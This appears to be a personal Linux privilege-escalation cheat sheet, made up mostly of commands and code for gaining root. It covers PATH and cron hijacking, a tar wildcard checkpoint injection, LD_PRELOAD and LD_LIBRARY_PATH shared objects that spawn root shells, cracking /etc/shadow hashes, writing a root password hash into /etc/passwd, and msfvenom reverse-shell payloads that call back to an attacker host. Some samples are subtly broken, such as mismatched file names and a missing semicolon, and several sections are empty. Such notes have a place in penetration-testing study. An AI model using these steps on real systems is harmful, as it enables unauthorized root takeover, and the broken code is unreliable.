- [Find](#Find)
  - [Find SUID](#SUID)
  - [Find writeable files](#writable_files)
  - [Find writable by current user](#writable_by_current_user)
  - [Find readable files](#readable_files)
  - [Find writable folders](#writable_folders)
- [Services_behind_firewall/localhost](#Localhost_services)
- [PATH_Variable](#PATH_Variable)
- [SUID](#SUID)
- [Cronjob](#Cronjob)
  - [Cron job enum](#Cronjobs)
  - [PATH Environment Variable(Path)
    - [Case Study](#case_1)
  - [wildcards](#wildcards)
    - [Case Study](#case_2)
- [Sudo](#Sudo)
  - [Environment Variables](#Environment_Variables)
- [NFS](#NFS)
- [Weak files permissions](#Weakfiles)
- [Services](#Services)
- [Kernel exploits](#Kernel)
- [Password](#Password)
- [Spawning Root Shells](#Spawning_root_shell)
- [Case_study_1](#case_study_1)
- [Case study 2](#case_study_2)
- [Tools](#Tools)
--------------------------------------------------------------------------------------------------------------------------------
# Find

### SUID
```
find / -perm -1000 -type d 2>/dev/null - Sticky bit
find / -perm -g=s -type f 2>/dev/null - SGID
find / -perm -u=s -type f 2>/dev/nul -SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null - SUID or SGID
```
### writable_files
```
- find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print 
- find / -writable -type d 2>/dev/null
- find / -writable -type f 2>/dev/null
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### writable by current user
```
find / perm /u=w -user whoami 2>/dev/null
find / -perm /u+w,g+w -f -user whoami 2>/dev/null
find / -perm /u+w -user whoami 2>/dev/null
```

### readable files
```
find / -perm -2 ! -type l -ls 2>/dev/null
```

### writable folder
```
find / -perm -o x -type d 2>/dev/null
```

### Find Writable & Executable files
```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
--------------------------------------------------------------------------------------------------------------------------------
# Localhost_services
```
netstat -ano
netstat -tulpn
```
--------------------------------------------------------------------------------------------------------------------------------
# PATH_Variable

#### Check the PATH
```
echo $PATH
```

#### case study one
- Binary file with SUID permission
  - check what the file do
  - for example *which linux commad use*
    - in our case we use *ps* command
- Create malicious file
  - echo "/bin/bash" or "/bin/sh" > /tmp/ps
  - chmod 777 /tmp/ps
  - *OR*
  - cp /bin/sh /tmp/ps
  - *OR*
  - ln -s /bin/sh /tmp/ps
    - export PATH=.:$PATH
- check PATH
  - echo $PATH
- change $PATH (add tmp folder)
  - export PATH=/tmp:$PATH
- run SUID binary
--------------------------------------------------------------------------------------------------------------------------------
# SUID
- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

#### Searching SUID file (SUID file is a special type of file permission given to a file
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
- find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
- find / -writable -type f 2>/dev/null>

### tip 'check suid/sgid files data'

#### Use strace for track suid file execute
```
strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve /suid/file/path 2>&1 | grep service
```
--------------------------------------------------------------------------------------------------------------------------------
# Cronjobs 
```
crontab -l
ls -alh /var/spool/cron
ls -alh /var/spool/crontabs
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root 
```

#### Path
```
crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job

#### case_1 
```
$ cat /etc/crontab
...
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/
usr/bin
...
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
The /home/user directory (which we can write to) is at the start
of the PATH variable, and the first cron job does not use an absolute path

Create the file overwrite.sh in /home/user with the following
contents:
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Ensure that overwrite.sh is executable:
```
$ chmod +x /home/user/overwrite.sh
```

### wildcards
When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard. 

The following commands should show how this works:
```
$ ls *
% touch ./-l
$ ls *
```
output execute ls -la

### case_2:
```
$ cat /etc/crontab
...
* * * * * root /usr/local/bin/compress.sh
```
View the contents of the /usr/local/bin/compress.sh file:

$ cat /usr/local/bin/compress.sh

```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Note that the tar command is run with a wildcard in the /home/user directory.

GTFOBins shows that tar has command line options which can be used to run other commands as part of a checkpoint feature.
create elf file
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf
-o shell.elf
```
Copy the file to the /home/user directory on the remote host.

Create two files in the /home/user directory:
```
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
```

Run a netcat listener

------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
# Sudo
Is a program which lets users run other program with the security privileges of the users.

### Useful commands
- Run program using sudo
  - sudo [program]
- Run porgram as specific user
  - sudo -u [username] [program]
- List programs a user allowed to run:
  - sudo -l

#### Other way to privileges (su program is not allowed)
- sudo -s
- sudo -i 
- sudo /bin/bash
- sudo passwd

#### gtfobins
- https://gtfobins.github.io/

#### Example with apache2
```
when apache parsing a given config file it will error and print any line it doesn't understand

sudo apache2 -f /etc/shadow
```

### Environment Variables
Programs run throuh sudo can inherit the environment variables from the users environment.
In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
The env_keep option can be used to keep certain environment variables from the user’s environment.
The configured options are displayed when running sudo -l

LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.
When set, the shared object will be loaded before any others.
By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.
LD_PRELOAD will not work if the real user ID is different from the effective user ID.
sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.

### Example with LD_PRELOAD
```
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
env_keep option includes the LD_PRELOAD environment variable

create file.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
$ gcc -fPIC -shared -nostartfiles -o /tmp/file.so file.c

run
sudo LD_PRELOAD=/tmp/preload.so apache2
```

##### LD_LIBRARY_PATH
The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
```
ldd /usr/sbin/apache2
```
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our
shared library instead.

Create a file (library_path.c)
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2
```

--------------------------------------------------------------------------------------------------------------------------------
# NFS

# Weak_files_permission

### Find all writeable files (maxdepth 1)
```
find /etc -maxdepth 1 -writable -type f
```
### Find all readable files (maxdepth 1)
```
find /etc -maxdepth 1 -readable -type f
```

### Find all directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```

### Readable and writeable files 
- /etc/shadow
  - If we are able to read the content of the shadow file, we might be able to crack the root user’s password hash.
  - If we are able to modify the shadow file, we can replace the root users password hash with one we know.  
- Check the permission of the /etc/shadow
```
ls -l /etc/shadow
```
- Extrackt the root users passwdord hash
```
head -n 1 /etc/shadow
```
- Crack the password hash
```
echo '$hash' > hash.txt'
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- /etc/passwd 
  - For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow. If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user. Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

- Structure:
```
root:x:0:0:root:/root:/bin/bash
```
The x in second filed instructs Linux to look for the password hash in /etc/shadow. In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password/
```
root::0:0:root:/root:/bin/bash
```
- Check the permissions of the /etc/password file (look for world writeable)
```
ls -la /etc/passw
```
- Generate a password hash for the password via openssl
```
openssl passwd "password"
L9yLGxncbOROc
```
- Edit /etc/passwd file and enter the hash in the second field of the root user row
```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```
- Log in as root

- Alternatively, append a new row to /etc/passwd
```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

### Backups files
- common places for searching
  - ls -la /home
  - ls -la /root
  - ls -la /tmp
  - ls -la /var/backups
  
 - confirm that root logins are even allowed via SSH
 ```
 grep PermitRootLogin /etc/ssh/sshd_config
 ```
 -----------------------------------------------------------------------------------------------------
# Services

#### Available services
- netstat -anlp
- netstat -ano

#### Running services
- ps aux | grep root
- ps -ef | grep root
- top
- cat /etc/services

#### Services misconfigured
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

#### Program version
- [program] --version
- [program] -v
- On debian distro, dpkg shows installed programs and their version
  - dpkg -l | grep [program]
- On systems that use rpm, the fallowing achieves the same
  - rpm -qa | grep [program]

##### Example
```
myqld --version
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Kernel

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Password
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Spawing_root_shells
binary
```
owned by the root user, and has the SUID bit set
int main() {
  setuid(0);
  system("/bin/bash -p");
}
gcc -o <name> <filename.c>
```
msfvenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf >
shell.elf

This reverse shell can be caught using netcat or metasploit’s own multi/handler.
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Environment Variables
##### Program run through sudo can inherit the environment variables from the user's environment
in sudowrs config file if env_reset option is set sudo will run programs in a new, miniml env
config options are display when running sudo -l

### LD_PRELOAD
is an environment variable can be set to path of shared object (.so) file
When  set, the shared object will be loaded before any others.
By creating a custom .so and creating init() function, we can execute code as soon as teh object is loaded

sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

LD_PRELOAD will no work if the real user id is defferent from the effective user ID


##### LD_LIBRARY_PATH: env variable contains a set of directories where shared libraries are searched for first

ldd command can be used to pritn the shared libraries
```
ldd /usr/sbin/apache2
```
by createing a shared library with the same name as one used by a program  and setting LD_library_path to its parent  the program will load our shared_library instead 


#### PATH Environment Variable case study
```
for PATH=/home/user
create file in /home/user
content: 
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 chmod +s file.sh
 
 wait: watch -n 1 ls -l /tmp
```

#### Wildcards
--------------------------------------------------------------------------------------------------------------------------------
# Case_study_1
### Create usefull C file
```
int main()
{
  setuid(0);
  system("/bin/bash -p");
}
```
```
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}
```
gcc -o [name] [filename.c]
--------------------------------------------------------------------------------------------------------------------------------
# Tools

### Run usefull script for linux enumeration
- ***Linenum***: https://github.com/rebootuser/LinEnum
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration
- ***BeRoot***: https://github.com/AlessandroZ/BeRoot
